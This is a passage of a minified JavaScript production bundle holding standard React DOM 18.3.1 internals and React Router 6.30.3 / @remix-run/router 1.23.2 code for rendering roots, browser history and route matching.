r=e.type;Pa(t,e),t=e.pendingProps;var i=Si(e,et.current);yi(e,n),i=_d(null,e,r,t,i,n);var s=wd();return e.flags|=1,typeof i=="object"&&i!==null&&typeof i.render=="function"&&i.$$typeof===void 0?(e.tag=1,e.memoizedState=null,e.updateQueue=null,mt(r)?(s=!0,Za(e)):s=!1,e.memoizedState=i.state!==null&&i.state!==void 0?i.state:null,pd(e),i.updater=Fl,e.stateNode=i,i._reactInternals=e,Zc(e,r,t,n),e=nh(null,e,r,!0,s,n)):(e.tag=0,_e&&s&&ad(e),it(null,e,i,n),e=e.child),e;case 16:r=e.elementType;e:{switch(Pa(t,e),t=e.pendingProps,i=r._init,r=i(r._payload),e.type=r,i=e.tag=YI(r),t=Mt(r,t),i){case 0:e=th(null,e,r,t,n);break e;case 1:e=Cm(null,e,r,t,n);break e;case 11:e=Sm(null,e,r,t,n);break e;case 14:e=Am(null,e,r,Mt(r.type,t),n);break e}throw Error(M(306,r,""))}return e;case 0:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:Mt(r,i),th(t,e,r,i,n);case 1:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:Mt(r,i),Cm(t,e,r,i,n);case 3:e:{if(Jv(e),t===null)throw Error(M(387));r=e.pendingProps,s=e.memoizedState,i=s.element,Av(t,e),il(e,r,null,n);var o=e.memoizedState;if(r=o.element,s.isDehydrated)if(s={element:r,isDehydrated:!1,cache:o.cache,pendingSuspenseBoundaries:o.pendingSuspenseBoundaries,transitions:o.transitions},e.updateQueue.baseState=s,e.memoizedState=s,e.flags&256){i=xi(Error(M(423)),e),e=Rm(t,e,r,n,i);break e}else if(r!==i){i=xi(Error(M(424)),e),e=Rm(t,e,r,n,i);break e}else for(wt=Yn(e.stateNode.containerInfo.firstChild),Tt=e,_e=!0,Ut=null,n=Iv(e,null,r,n),e.child=n;n;)n.flags=n.flags&-3|4096,n=n.sibling;else{if(Ai(),r===i){e=En(t,e,n);break e}it(t,e,r,n)}e=e.child}return e;case 5:return Cv(e),t===null&&Yc(e),r=e.type,i=e.pendingProps,s=t!==null?t.memoizedProps:null,o=i.children,qc(r,i)?o=null:s!==null&&qc(r,s)&&(e.flags|=32),Xv(t,e),it(t,e,o,n),e.child;case 6:return t===null&&Yc(e),null;case 13:return Zv(t,e,n);case 4:return md(e,e.stateNode.containerInfo),r=e.pendingProps,t===null?e.child=Ci(e,null,r,n):it(t,e,r,n),e.child;case 11:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:Mt(r,i),Sm(t,e,r,i,n);case 7:return it(t,e,e.pendingProps,n),e.child;case 8:return it(t,e,e.pendingProps.children,n),e.child;case 12:return it(t,e,e.pendingProps.children,n),e.child;case 10:e:{if(r=e.type._context,i=e.pendingProps,s=e.memoizedProps,o=i.value,fe(nl,r._currentValue),r._currentValue=o,s!==null)if($t(s.value,o)){if(s.children===i.children&&!pt.current){e=En(t,e,n);break e}}else for(s=e.child,s!==null&&(s.return=e);s!==null;){var l=s.dependencies;if(l!==null){o=s.child;for(var u=l.firstContext;u!==null;){if(u.context===r){if(s.tag===1){u=gn(-1,n&-n),u.tag=2;var h=s.updateQueue;if(h!==null){h=h.shared;var f=h.pending;f===null?u.next=u:(u.next=f.next,f.next=u),h.pending=u}}s.lanes|=n,u=s.alternate,u!==null&&(u.lanes|=n),Xc(s.return,n,e),l.lanes|=n;break}u=u.next}}else if(s.tag===10)o=s.type===e.type?null:s.child;else if(s.tag===18){if(o=s.return,o===null)throw Error(M(341));o.lanes|=n,l=o.alternate,l!==null&&(l.lanes|=n),Xc(o,n,e),o=s.sibling}else o=s.child;if(o!==null)o.return=s;else for(o=s;o!==null;){if(o===e){o=null;break}if(s=o.sibling,s!==null){s.return=o.return,o=s;break}o=o.return}s=o}it(t,e,i.children,n),e=e.child}return e;case 9:return i=e.type,r=e.pendingProps.children,yi(e,n),i=Dt(i),r=r(i),e.flags|=1,it(t,e,r,n),e.child;case 14:return r=e.type,i=Mt(r,e.pendingProps),i=Mt(r.type,i),Am(t,e,r,i,n);case 15:return Qv(t,e,e.type,e.pendingProps,n);case 17:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:Mt(r,i),Pa(t,e),e.tag=1,mt(r)?(t=!0,Za(e)):t=!1,yi(e,n),Hv(e,r,i),Zc(e,r,i,n),nh(null,e,r,!0,t,n);case 19:return e_(t,e,n);case 22:return Yv(t,e,n)}throw Error(M(156,e.tag))};function g_(t,e){return $y(t,e)}function QI(t,e,n,r){this.tag=t,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=e,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function kt(t,e,n,r){return new QI(t,e,n,r)}function Pd(t){return t=t.prototype,!(!t||!t.isReactComponent)}function YI(t){if(typeof t=="function")return Pd(t)?1:0;if(t!=null){if(t=t.$$typeof,t===Qh)return 11;if(t===Yh)return 14}return 2}function er(t,e){var n=t.alternate;return n===null?(n=kt(t.tag,e,t.key,t.mode),n.elementType=t.elementType,n.type=t.type,n.stateNode=t.stateNode,n.alternate=t,t.alternate=n):(n.pendingProps=e,n.type=t.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=t.flags&14680064,n.childLanes=t.childLanes,n.lanes=t.lanes,n.child=t.child,n.memoizedProps=t.memoizedProps,n.memoizedState=t.memoizedState,n.updateQueue=t.updateQueue,e=t.dependencies,n.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext},n.sibling=t.sibling,n.index=t.index,n.ref=t.ref,n}function ba(t,e,n,r,i,s){var o=2;if(r=t,typeof t=="function")Pd(t)&&(o=1);else if(typeof t=="string")o=5;else e:switch(t){case ti:return Cr(n.children,i,s,e);case Kh:o=8,i|=8;break;case Ic:return t=kt(12,n,e,i|2),t.elementType=Ic,t.lanes=s,t;case Sc:return t=kt(13,n,e,i),t.elementType=Sc,t.lanes=s,t;case Ac:return t=kt(19,n,e,i),t.elementType=Ac,t.lanes=s,t;case Cy:return zl(n,i,s,e);default:if(typeof t=="object"&&t!==null)switch(t.$$typeof){case Sy:o=10;break e;case Ay:o=9;break e;case Qh:o=11;break e;case Yh:o=14;break e;case Vn:o=16,r=null;break e}throw Error(M(130,t==null?t:typeof t,""))}return e=kt(o,n,e,i),e.elementType=t,e.type=r,e.lanes=s,e}function Cr(t,e,n,r){return t=kt(7,t,r,e),t.lanes=n,t}function zl(t,e,n,r){return t=kt(22,t,r,e),t.elementType=Cy,t.lanes=n,t.stateNode={isHidden:!1},t}function sc(t,e,n){return t=kt(6,t,null,e),t.lanes=n,t}function oc(t,e,n){return e=kt(4,t.children!==null?t.children:[],t.key,e),e.lanes=n,e.stateNode={containerInfo:t.containerInfo,pendingChildren:null,implementation:t.implementation},e}function XI(t,e,n,r,i){this.tag=e,this.containerInfo=t,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=ju(0),this.expirationTimes=ju(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=ju(0),this.identifierPrefix=r,this.onRecoverableError=i,this.mutableSourceEagerHydrationData=null}function Nd(t,e,n,r,i,s,o,l,u){return t=new XI(t,e,n,l,u),e===1?(e=1,s===!0&&(e|=8)):e=0,s=kt(3,null,null,e),t.current=s,s.stateNode=t,s.memoizedState={element:r,isDehydrated:n,cache:null,transitions:null,pendingSuspenseBoundaries:null},pd(s),t}function JI(t,e,n){var r=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:ei,key:r==null?null:""+r,children:t,containerInfo:e,implementation:n}}function y_(t){if(!t)return or;t=t._reactInternals;e:{if(zr(t)!==t||t.tag!==1)throw Error(M(170));var e=t;do{switch(e.tag){case 3:e=e.stateNode.context;break e;case 1:if(mt(e.type)){e=e.stateNode.__reactInternalMemoizedMergedChildContext;break e}}e=e.return}while(e!==null);throw Error(M(171))}if(t.tag===1){var n=t.type;if(mt(n))return yv(t,n,e)}return e}function v_(t,e,n,r,i,s,o,l,u){return t=Nd(n,r,!0,t,i,s,o,l,u),t.context=y_(null),n=t.current,r=st(),i=Zn(n),s=gn(r,i),s.callback=e??null,Xn(n,s,i),t.current.lanes=i,go(t,i,r),gt(t,r),t}function Bl(t,e,n,r){var i=e.current,s=st(),o=Zn(i);return n=y_(n),e.context===null?e.context=n:e.pendingContext=n,e=gn(s,o),e.payload={element:t},r=r===void 0?null:r,r!==null&&(e.callback=r),t=Xn(i,e,o),t!==null&&(Bt(t,i,o,s),Ra(t,i,o)),o}function dl(t){if(t=t.current,!t.child)return null;switch(t.child.tag){case 5:return t.child.stateNode;default:return t.child.stateNode}}function Mm(t,e){if(t=t.memoizedState,t!==null&&t.dehydrated!==null){var n=t.retryLane;t.retryLane=n!==0&&n<e?n:e}}function Dd(t,e){Mm(t,e),(t=t.alternate)&&Mm(t,e)}function ZI(){return null}var __=typeof reportError=="function"?reportError:function(t){console.error(t)};function bd(t){this._internalRoot=t}$l.prototype.render=bd.prototype.render=function(t){var e=this._internalRoot;if(e===null)throw Error(M(409));Bl(t,e,null,null)};$l.prototype.unmount=bd.prototype.unmount=function(){var t=this._internalRoot;if(t!==null){this._internalRoot=null;var e=t.containerInfo;Vr(function(){Bl(null,t,null,null)}),e[_n]=null}};function $l(t){this._internalRoot=t}$l.prototype.unstable_scheduleHydration=function(t){if(t){var e=Yy();t={blockedOn:null,target:t,priority:e};for(var n=0;n<Ln.length&&e!==0&&e<Ln[n].priority;n++);Ln.splice(n,0,t),n===0&&Jy(t)}};function Vd(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11)}function Wl(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11&&(t.nodeType!==8||t.nodeValue!==" react-mount-point-unstable "))}function Fm(){}function eS(t,e,n,r,i){if(i){if(typeof r=="function"){var s=r;r=function(){var h=dl(o);s.call(h)}}var o=v_(e,r,t,0,null,!1,!1,"",Fm);return t._reactRootContainer=o,t[_n]=o.current,Qs(t.nodeType===8?t.parentNode:t),Vr(),o}for(;i=t.lastChild;)t.removeChild(i);if(typeof r=="function"){var l=r;r=function(){var h=dl(u);l.call(h)}}var u=Nd(t,0,!1,null,null,!1,!1,"",Fm);return t._reactRootContainer=u,t[_n]=u.current,Qs(t.nodeType===8?t.parentNode:t),Vr(function(){Bl(e,u,n,r)}),u}function ql(t,e,n,r,i){var s=n._reactRootContainer;if(s){var o=s;if(typeof i=="function"){var l=i;i=function(){var u=dl(o);l.call(u)}}Bl(e,o,t,i)}else o=eS(n,e,t,i,r);return dl(o)}Ky=function(t){switch(t.tag){case 3:var e=t.stateNode;if(e.current.memoizedState.isDehydrated){var n=_s(e.pendingLanes);n!==0&&(Zh(e,n|1),gt(e,Re()),!(oe&6)&&(ki=Re()+500,dr()))}break;case 13:Vr(function(){var r=wn(t,1);if(r!==null){var i=st();Bt(r,t,1,i)}}),Dd(t,1)}};ed=function(t){if(t.tag===13){var e=wn(t,134217728);if(e!==null){var n=st();Bt(e,t,134217728,n)}Dd(t,134217728)}};Qy=function(t){if(t.tag===13){var e=Zn(t),n=wn(t,e);if(n!==null){var r=st();Bt(n,t,e,r)}Dd(t,e)}};Yy=function(){return ue};Xy=function(t,e){var n=ue;try{return ue=t,e()}finally{ue=n}};Oc=function(t,e,n){switch(e){case"input":if(xc(t,n),e=n.name,n.type==="radio"&&e!=null){for(n=t;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+e)+'][type="radio"]'),e=0;e<n.length;e++){var r=n[e];if(r!==t&&r.form===t.form){var i=Ol(r);if(!i)throw Error(M(90));xy(r),xc(r,i)}}}break;case"textarea":Py(t,n);break;case"select":e=n.value,e!=null&&fi(t,!!n.multiple,e,!1)}};My=Rd;Fy=Vr;var tS={usingClientEntryPoint:!1,Events:[vo,si,Ol,Oy,Ly,Rd]},ms={findFiberByHostInstance:Er,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},nS={bundleType:ms.bundleType,version:ms.version,rendererPackageName:ms.rendererPackageName,rendererConfig:ms.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:Rn.ReactCurrentDispatcher,findHostInstanceByFiber:function(t){return t=zy(t),t===null?null:t.stateNode},findFiberByHostInstance:ms.findFiberByHostInstance||ZI,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var ma=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!ma.isDisabled&&ma.supportsFiber)try{Nl=ma.inject(nS),Qt=ma}catch{}}St.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=tS;St.createPortal=function(t,e){var n=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!Vd(e))throw Error(M(200));return JI(t,e,null,n)};St.createRoot=function(t,e){if(!Vd(t))throw Error(M(299));var n=!1,r="",i=__;return e!=null&&(e.unstable_strictMode===!0&&(n=!0),e.identifierPrefix!==void 0&&(r=e.identifierPrefix),e.onRecoverableError!==void 0&&(i=e.onRecoverableError)),e=Nd(t,1,!1,null,null,n,!1,r,i),t[_n]=e.current,Qs(t.nodeType===8?t.parentNode:t),new bd(e)};St.findDOMNode=function(t){if(t==null)return null;if(t.nodeType===1)return t;var e=t._reactInternals;if(e===void 0)throw typeof t.render=="function"?Error(M(188)):(t=Object.keys(t).join(","),Error(M(268,t)));return t=zy(e),t=t===null?null:t.stateNode,t};St.flushSync=function(t){return Vr(t)};St.hydrate=function(t,e,n){if(!Wl(e))throw Error(M(200));return ql(null,t,e,!0,n)};St.hydrateRoot=function(t,e,n){if(!Vd(t))throw Error(M(405));var r=n!=null&&n.hydratedSources||null,i=!1,s="",o=__;if(n!=null&&(n.unstable_strictMode===!0&&(i=!0),n.identifierPrefix!==void 0&&(s=n.identifierPrefix),n.onRecoverableError!==void 0&&(o=n.onRecoverableError)),e=v_(e,null,t,1,n??null,i,!1,s,o),t[_n]=e.current,Qs(t),r)for(t=0;t<r.length;t++)n=r[t],i=n._getVersion,i=i(n._source),e.mutableSourceEagerHydrationData==null?e.mutableSourceEagerHydrationData=[n,i]:e.mutableSourceEagerHydrationData.push(n,i);return new $l(e)};St.render=function(t,e,n){if(!Wl(e))throw Error(M(200));return ql(null,t,e,!1,n)};St.unmountComponentAtNode=function(t){if(!Wl(t))throw Error(M(40));return t._reactRootContainer?(Vr(function(){ql(null,null,t,!1,function(){t._reactRootContainer=null,t[_n]=null})}),!0):!1};St.unstable_batchedUpdates=Rd;St.unstable_renderSubtreeIntoContainer=function(t,e,n,r){if(!Wl(n))throw Error(M(200));if(t==null||t._reactInternals===void 0)throw Error(M(38));return ql(t,e,n,!1,r)};St.version="18.3.1-next-f1338f8080-20240426";function w_(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(w_)}catch(t){console.error(t)}}w_(),wy.exports=St;var rS=wy.exports,Um=rS;Ec.createRoot=Um.createRoot,Ec.hydrateRoot=Um.hydrateRoot;/**
 * @remix-run/router v1.23.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function io(){return io=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(t[r]=n[r])}return t},io.apply(this,arguments)}var Wn;(function(t){t.Pop="POP",t.Push="PUSH",t.Replace="REPLACE"})(Wn||(Wn={}));const jm="popstate";function iS(t){t===void 0&&(t={});function e(r,i){let{pathname:s,search:o,hash:l}=r.location;return ph("",{pathname:s,search:o,hash:l},i.state&&i.state.usr||null,i.state&&i.state.key||"default")}function n(r,i){return typeof i=="string"?i:E_(i)}return oS(e,n,null,t)}function Ne(t,e){if(t===!1||t===null||typeof t>"u")throw new Error(e)}function Od(t,e){if(!t){typeof console<"u"&&console.warn(e);try{throw new Error(e)}catch{}}}function sS(){return Math.random().toString(36).substr(2,8)}function zm(t,e){return{usr:t.state,key:t.key,idx:e}}function ph(t,e,n,r){return n===void 0&&(n=null),io({pathname:typeof t=="string"?t:t.pathname,search:"",hash:""},typeof e=="string"?Bi(e):e,{state:n,key:e&&e.key||r||sS()})}function E_(t){let{pathname:e="/",search:n="",hash:r=""}=t;return n&&n!=="?"&&(e+=n.charAt(0)==="?"?n:"?"+n),r&&r!=="#"&&(e+=r.charAt(0)==="#"?r:"#"+r),e}function Bi(t){let e={};if(t){let n=t.indexOf("#");n>=0&&(e.hash=t.substr(n),t=t.substr(0,n));let r=t.indexOf("?");r>=0&&(e.search=t.substr(r),t=t.substr(0,r)),t&&(e.pathname=t)}return e}function oS(t,e,n,r){r===void 0&&(r={});let{window:i=document.defaultView,v5Compat:s=!1}=r,o=i.history,l=Wn.Pop,u=null,h=f();h==null&&(h=0,o.replaceState(io({},o.state,{idx:h}),""));function f(){return(o.state||{idx:null}).idx}function p(){l=Wn.Pop;let N=f(),S=N==null?null:N-h;h=N,u&&u({action:l,location:k.location,delta:S})}function g(N,S){l=Wn.Push;let _=ph(k.location,N,S);h=f()+1;let R=zm(_,h),V=k.createHref(_);try{o.pushState(R,"",V)}catch(U){if(U instanceof DOMException&&U.name==="DataCloneError")throw U;i.location.assign(V)}s&&u&&u({action:l,location:k.location,delta:1})}function v(N,S){l=Wn.Replace;let _=ph(k.location,N,S);h=f();let R=zm(_,h),V=k.createHref(_);o.replaceState(R,"",V),s&&u&&u({action:l,location:k.location,delta:0})}function A(N){let S=i.location.origin!=="null"?i.location.origin:i.location.href,_=typeof N=="string"?N:E_(N);return _=_.replace(/ $/,"%20"),Ne(S,"No window.location.(origin|href) available to create URL for href: "+_),new URL(_,S)}let k={get action(){return l},get location(){return t(i,o)},listen(N){if(u)throw new Error("A history only accepts one active listener");return i.addEventListener(jm,p),u=N,()=>{i.removeEventListener(jm,p),u=null}},createHref(N){return e(i,N)},createURL:A,encodeLocation(N){let S=A(N);return{pathname:S.pathname,search:S.search,hash:S.hash}},push:g,replace:v,go(N){return o.go(N)}};return k}var Bm;(function(t){t.data="data",t.deferred="deferred",t.redirect="redirect",t.error="error"})(Bm||(Bm={}));function aS(t,e,n){return n===void 0&&(n="/"),lS(t,e,n)}function lS(t,e,n,r){let i=typeof e=="string"?Bi(e):e,s=S_(i.pathname||"/",n);if(s==null)return null;let o=T_(t);uS(o);let l=null;for(let u=0;l==null&&u<o.length;++u){let h=ES(s);l=vS(o[u],h)}return l}function T_(t,e,n,r){e===void 0&&(e=[]),n===void 0&&(n=[]),r===void 0&&(r="");let i=(s,o,l)=>{let u={relativePath:l===void 0?s.path||"":l,caseSensitive:s.caseSensitive===!0,childrenIndex:o,route:s};u.relativePath.startsWith("/")&&(Ne(u.relativePath.startsWith(r),'Absolute route path "'+u.relativePath+'" nested under path '+('"'+r+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),u.relativePath=u.relativePath.slice(r.length));let h=Rr([r,u.relativePath]),f=n.concat(u);s.children&&s.children.length>0&&(Ne(s.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+h+'".')),T_(s.children,e,f,h)),!(s.path==null&&!s.index)&&e.push({path:h,score:gS(h,s.index),routesMeta:f})};return t.forEach((s,o)=>{var l;if(s.path===""||!((l=s.path)!=null&&l.includes("?")))i(s,o);else for(let u of I_(s.path))i(s,o,u)}),e}function I_(t){let e=t.split("/");if(e.length===0)return[];let[n,...r]=e,i=n.endsWith("?"),s=n.replace(/\?$/,"");if(r.length===0)return i?[s,""]:[s];let o=I_(r.join("/")),l=[];return l.push(...o.map(u=>u===""?s:[s,u].join("/"))),i&&l.push(...o),l.map(u=>t.startsWith("/")&&u===""?"/":u)}function uS(t){t.sort((e,n)=>e.score!==n.score?n.score-e.score:yS(e.routesMeta.map(r=>r.childrenIndex),n.routesMeta.map(r=>r.childrenIndex)))}const cS=/^:[\w-]+$/,hS=3,dS=2,fS=1,pS=10,mS=-2,$m=t=>t==="*";function gS(t,e){let n=t.split("/"),r=n.length;return n.some($m)&&(r+=mS),e&&(r+=dS),n.filter(i=>!$m(i)).reduce((i,s)=>i+(cS.test(s)?hS:s===""?fS:pS),r)}function yS(t,e){return t.length===e.length&&t.slice(0,-1).every((r,i)=>r===e[i])?t[t.length-1]-e[e.length-1]:0}function vS(t,e,n){let{routesMeta:r}=t,i={},s="/",o=[];for(let l=0;l<r.length;++l){let u=r[l],h=l===r.length-1,f=s==="/"?e:e.slice(s.length)||"/",p=_S({path:u.relativePath,caseSensitive:u.caseSensitive,end:h},f),g=u.route;if(!p)return null;Object.assign(i,p.params),o.push({params:i,pathname:Rr([s,p.pathname]),pathnameBase:CS(Rr([s,p.pathnameBase])),route:g}),p.pathnameBase!=="/"&&(s=Rr([s,p.pathnameBase]))}return o}function _S(t,e){typeof t=="string"&&(t={path:t,caseSensitive:!1,end:!0});let[n,r]=wS(t.path,t.caseSensitive,t.end),i=e.match(n);if(!i)return null;let s=i[0],o=s.replace(/(.)\/+$/,"$1"),l=i.slice(1);return{params:r.reduce((h,f,p)=>{let{paramName:g,isOptional:v}=f;if(g==="*"){let k=l[p]||"";o=s.slice(0,s.length-k.length).replace(/(.)\/+$/,"$1")}const A=l[p];return v&&!A?h[g]=void 0:h[g]=(A||"").replace(/%2F/g,"/"),h},{}),pathname:s,pathnameBase:o,pattern:t}}function wS(t,e,n){e===void 0&&(e=!1),n===void 0&&(n=!0),Od(t==="*"||!t.endsWith("*")||t.endsWith("/*"),'Route path "'+t+'" will be treated as if it were '+('"'+t.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+t.replace(/\*$/,"/*")+'".'));let r=[],i="^"+t.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(o,l,u)=>(r.push({paramName:l,isOptional:u!=null}),u?"/?([^\\/]+)?":"/([^\\/]+)"));return t.endsWith("*")?(r.push({paramName:"*"}),i+=t==="*"||t==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):n?i+="\\/*$":t!==""&&t!=="/"&&(i+="(?:(?=\\/|$))"),[new RegExp(i,e?void 0:"i"),r]}function ES(t){try{return t.split("/").map(e=>decodeURIComponent(e).replace(/\//g,"%2F")).join("/")}catch(e){return Od(!1,'The URL path "'+t+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+e+").")),t}}function S_(t,e){if(e==="/")return t;if(!t.toLowerCase().startsWith(e.toLowerCase()))return null;let n=e.endsWith("/")?e.length-1:e.length,r=t.charAt(n);return r&&r!=="/"?null:t.slice(n)||"/"}const TS=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,IS=t=>TS.test(t);function SS(t,e){e===void 0&&(e="/");let{pathname:n,search:r="",hash:i=""}=typeof t=="string"?Bi(t):t,s;if(n)if(IS(n))s=n;else{if(n.includes("//")){let o=n;n=n.replace(/\/\/+/g,"/"),Od(!1,"Pathnames cannot have embedded double slashes - normalizing "+(o+" -> "+n))}n.startsWith("/")?s=Wm(n.substring(1),"/"):s=Wm(n,e)}else s=e;return{pathname:s,search:RS(r),hash:xS(i)}}function Wm(t,e){let n=e.replace(/\/+$/,"").split("/");return t.split("/").forEach(i=>{i===".."?n.length>1&&n.pop():i!=="."&&n.push(i)}),n.length>1?n.join("/"):"/"}function ac(t,e,n,r){return"Cannot include a '"+t+"' character in a manually specified "+("`to."+e+"` field ["+JSON.stringify(r)+"].  Please separate it out to the ")+("`to."+n+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function AS(t){return t.filter((e,n)=>n===0||e.route.path&&e.route.path.length>0)}function A_(t,e){let n=AS(t);return e?n.map((r,i)=>i===n.length-1?r.pathname:r.pathnameBase):n.map(r=>r.pathnameBase)}function C_(t,e,n,r){r===void 0&&(r=!1);let i;typeof t=="string"?i=Bi(t):(i=io({},t),Ne(!i.pathname||!i.pathname.includes("?"),ac("?","pathname","search",i)),Ne(!i.pathname||!i.pathname.includes("#"),ac("#","pathname","hash",i)),Ne(!i.search||!i.search.includes("#"),ac("#","search","hash",i)));let s=t===""||i.pathname==="",o=s?"/":i.pathname,l;if(o==null)l=n;else{let p=e.length-1;if(!r&&o.startsWith("..")){let g=o.split("/");for(;g[0]==="..";)g.shift(),p-=1;i.pathname=g.join("/")}l=p>=0?e[p]:"/"}let u=SS(i,l),h=o&&o!=="/"&&o.endsWith("/"),f=(s||o===".")&&n.endsWith("/");return!u.pathname.endsWith("/")&&(h||f)&&(u.pathname+="/"),u}const Rr=t=>t.join("/").replace(/\/\/+/g,"/"),CS=t=>t.replace(/\/+$/,"").replace(/^\/*/,"/"),RS=t=>!t||t==="?"?"":t.startsWith("?")?t:"?"+t,xS=t=>!t||t==="#"?"":t.startsWith("#")?t:"#"+t;function kS(t){return t!=null&&typeof t.status=="number"&&typeof t.statusText=="string"&&typeof t.internal=="boolean"&&"data"in t}const R_=["post","put","patch","delete"];new Set(R_);const PS=["get",...R_];new Set(PS);/**
 * React Router v6.30.3
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function so(){return so=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(t[r]=n[r])}return t},so.apply(this,arguments)}const Ld=F.createContext(null),NS=F.createContext(null),wo=F.createContext(null),Hl=F.createContext(null),Br=F.createContext({outlet:null,matches:[],isDataRoute:!1}),x_=F.createContext(null);function Eo(){return F.useContext(Hl)!=null}function Md(){return Eo()||Ne(!1),F.useContext(Hl).location}function k_(t){F.useContext(wo).static||F.useLayoutEffect(t)}function DS(){let{isDataRoute:t}=F.useContext(Br);return t?qS():bS()}function bS(){Eo()||Ne(!1);let t=F.useContext(Ld),{basename:e,future:n,navigator:r}=F.useContext(wo),{matches:i}=F.useContext(Br),{pathname:s}=Md(),o=JSON.stringify(A_(i,n.v7_relativeSplatPath)),l=F.useRef(!1);return k_(()=>{l.current=!0}),F.useCallback(function(h,f){if(f===void 0&&(f={}),!l.current)return;if(typeof h=="number"){r.go(h);return}let p=C_(h,JSON.parse(o),s,f.relative==="path");t==null&&e!=="/"&&(p.pathname=p.pathname==="/"?e:Rr([e,p.pathname])),(f.replace?r.replace:r.push)(p,f.state,f)},[e,r,o,s,t])}function VS(t,e){return OS(t,e)}function OS(t,e,n,r){Eo()||Ne(!1);let{navigator:i}=F.useContext(wo),{matches:s}=F.useContext(Br),o=s[s.length-1],l=o?o.params:{};o&&o.pathname;let u=o?o.pathnameBase:"/";o&&o.route;let h=Md(),f;if(e){var p;let N=typeof e=="string"?Bi(e):e;u==="/"||(p=N.pathname)!=null&&p.startsWith(u)||Ne(!1),f=N}else f=h;let g=f.pathname||"/",v=g;if(u!=="/"){let N=u.replace(/^\//,"").split("/");v="/"+g.replace(/^\//,"").split("/").slice(N.length).join("/")}let A=aS(t,{pathname:v}),k=jS(A&&A.map(N=>Object.assign({},N,{params:Object.assign({},l,N.params),pathname:Rr([u,i.encodeLocation?i.encodeLocation(N.pathname).pathname:N.pathname]),pathnameBase:N.pathnameBase==="/"?u:Rr([u,i.encodeLocation?i.encodeLocation(N.pathnameBase).pathname:N.pathnameBase])})),s,n,r);return e&&k?F.createElement(Hl.Provider,{value:{location:so({pathname:"/",search:"",hash:"",state:null,key:"default"},f),navigationType:Wn.Pop}},k):k}function LS(){let t=WS(),e=kS(t)?t.status+" "+t.statusText:t instanceof Error?t.message:JSON.stringify(t),n=t instanceof Error?t.stack:null,i={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return F.createElement(F.Fragment,null,F.createElement("h2",null,"Unexpected Application Error!"),F.createElement("h3",{style:{fontStyle:"italic"}},e),n?F.createElement("pre",{style:i},n):null,null)}const MS=F.createElement(LS,null);class FS extends F.Component{constructor(e){super(e),this.state={location:e.location,revalidation:e.revalidation,error:e.error}}static getDerivedStateFromError(e){return{error:e}}static getDerivedStateFromProps(e,n){return n.location!==e.location||n.revalidation!=="idle"&&e.revalidation==="idle"?{error:e.error,location:e.location,revalidation:e.revalidation}:{error:e.error!==void 0?e.error:n.error,location:n.location,revalidation:e.revalidation||n.revalidation}}componentDidCatch(e,n){console.error("React Router caught the following error during render",e,n)}render(){return this.state.error!==void 0?F.createElement(Br.Provider,{value:this.props.routeContext},F.createElement(x_.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function US(t){let{routeContext:e,match:n,children:r}=t,i=F.useContext(Ld);return i&&i.static&&i.staticContext&&(n.route.errorElement||n.route.ErrorBoundary)&&(i.staticContext._deepestRenderedBoundaryId=n.route.id),F.createElement(Br.Provider,{value:e},r)}function 